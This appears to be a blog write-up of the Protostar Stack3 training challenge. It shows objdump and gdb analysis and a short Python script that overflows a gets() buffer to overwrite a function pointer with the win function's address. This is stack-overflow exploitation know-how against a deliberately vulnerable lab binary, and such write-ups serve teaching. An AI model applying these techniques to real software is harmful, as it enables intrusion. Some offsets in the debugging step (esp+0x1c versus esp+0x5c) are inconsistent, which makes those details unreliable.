---
title: Protostar - Stack 3
date: 2024-02-14 18:32:00
categories: [binary-exploitation, protostar]
tags: [protostar, binary-exploitation, stack3]
---

# Conquering Stack3 at Protostar Machine
Hello Hackers ! , Today is the day I continue on my journey to conquer the [Stack3](https://exploit.education/protostar/stack-three/) binary. on [Protostar](https://exploit.education/protostar) machine.

This challenge requiring us to Redirect Execution to call function called `win` defined in the code useing through exploitation of stack-bufferoverflow.

## **Challenge Overview**
- **Challenge Name:** [Stack3](https://exploit.education/protostar/stack-three/)
- **Machine:** [Protostar](https://exploit.education/protostar)


### Step 1: Explore Binary
- let,s run `/opt/protostar/bin/stack3` binary
![Stack3 Explore](/assets/img/protostar/stack3-explore.png)

Hmm there is input ... Hmmm i think i know this function which prompt input XD .. , but iam not sure for now ..

### Step 2: Analysis

disassemble `main` function

```sh
objdump -M intel -d /opt/protostar/bin/stack3 | grep '<main>' -A 20
```
get  address of `win` function

```sh
objdump -M intel -d /opt/protostar/bin/stack3 | grep '<win>'
```
![Stack3 Analysis](/assets/img/protostar/stack3-analysis.png)

1. Function Prologue:
- `push ebp`  Save the base pointer.
- `mov ebp, esp`  Set up a new base pointer.
- `and esp, 0xfffffff0` Align the stack.
- `sub esp, 0x60` Allocate space for local variables.
2. Variables
`mov DWORD PTR [esp+0x5c],0x0` : Assign Local Variable `[esp+0x5c]` at to 0  
3. Function Calls
- `call 0x08048330 gets@plt` call to function `gets` Oh there the function what i think it used for prompt input XD
- `call   8048350 <printf@plt>` call to function `print`
- `call eax`  call to function address at eax`
4. Conditional Check
- `cmp    DWORD PTR [esp+0x5c],0x0` if local variable at `[esp+0x5c]` still equal 0
- `je     8048477 <main+0x3f>` then `jmp` to `0x08048477` which is the end of fucnction and return 

5. Function Pointer : asseign address of `[esp+0x5c]` if it wasn,t zero to `eax` and then call `eax`
- `mov    eax,DWORD PTR [esp+0x5c]` Move function pointer to `eax`
- `call eax` call function pointer

6. `win` Function address is at `0x08048424`

### Step 3: Debugging

1. create fuzz script at `~/fuzz.py` contains:
```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
print(fuzz)
```
2. debug binary with gdb and disassemble main 
3. break point at moveing `cmp [esp+0x1c],0`
4. run binary with stdin from output of running `~/fuzz.py`
5. check fuzz value at pointer `esp+0x1c`

![Stack3 Debug](/assets/img/protostar/stack3-gdb-debug.png)

and we found value at pointer `[esp+0x5c]` `0x51515151` with is `QQQQ` as ascii representation.. Hmmmm Now it will be everything going easy !

![Stack3 Found Offset](/assets/img/protostar/stack3-gdb-found-offset.png)

### Step 4: Crafting Solution

okay let,s update our script: `~/fuzz.py`
```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
esp_plus_5c="\x24\x84\x04\x08" # represent 0x08048424 on little endian machines. 0x08048424 is address of win function
print(fuzz+esp_plus_5c)
```
- now esp+0x5c will contain `0x08048424` which is  address of win function and it will moved later to `eax` then our program call `eax` which call function pointer `win` 

- and when run program with our script output as stdin for program ,  function `win` will be called ! 

![Stack3 Solved](/assets/img/protostar/stack3-solved.png)

Oh it Works Again !,  Hack the planet XD ..

